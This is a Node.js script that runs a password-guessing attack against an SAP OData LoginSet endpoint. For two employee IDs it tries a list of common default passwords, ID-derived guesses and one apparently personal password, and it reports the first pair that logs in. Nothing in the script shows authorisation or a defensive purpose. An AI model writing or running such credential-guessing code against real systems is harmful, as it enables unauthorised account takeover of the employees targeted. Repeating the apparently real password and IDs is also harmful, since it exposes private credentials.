const axios = require('axios');
const config = require('./src/config');

const sapCredentials = Buffer.from(`${config.sapUser}:${config.sapPassword}`).toString('base64');
const sapAxios = axios.create({
  baseURL: `${config.sapBaseUrl}${config.sapServicePath}`,
  timeout: 30000,
  headers: {
    'Authorization': `Basic ${sapCredentials}`,
    'Content-Type': 'application/json',
    'Accept': 'application/json',
  },
});

async function test() {
  const ids = ["00000014", "00000093"];
  const passwords = [
    "Vinodh@5284456",
    "sap123",
    "sap",
    "India123",
    "Init123",
    "init123",
    "Welcome1",
    "welcome",
    "123456",
    "12345",
    "password",
    "00902014",
    "00902093",
    "K902093",
    "902093",
    "902014"
  ];

  console.log("Testing passwords for employee IDs...");
  for (const id of ids) {
    for (const pwd of passwords) {
      try {
        const res = await sapAxios.get(`/LoginSet?$filter=EmpId eq '${id}' and Password eq '${pwd}'&$format=json`);
        const result = res.data?.d?.results?.[0];
        if (result) {
          if (result.Status !== 'E') {
            console.log(`🎉 SUCCESS! ID: ${id}, Pwd: ${pwd} -> Status: ${result.Status}, Message: ${result.Message}`);
            return;
          } else {
            console.log(`ID: ${id}, Pwd: ${pwd} -> Status: ${result.Status}, Msg: ${result.Message}`);
          }
        }
      } catch (err) {
        console.log(`ID: ${id}, Pwd: ${pwd} -> Error: ${err.message}`);
      }
    }
  }
  console.log("Testing finished.");
}

test();
